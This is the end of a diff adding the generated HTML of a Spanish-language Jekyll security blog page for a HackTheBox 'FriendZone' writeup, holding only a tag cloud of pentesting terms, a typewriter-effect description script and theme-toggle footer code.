+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hacking/" class="set-4">Hacking</a> <a href="/tag/hacking%2C/" class="set-1">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/oscp/" class="set-4">OSCP</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path%2C/" class="set-4">Path,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-1">Web</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-1">Writeup</a> <a href="/tag/writeup%2C/" class="set-4">Writeup,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'Writeup de la maquina de HackTheBox llamada FRIENDZONE siguiendo el PATH para el OSCP';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
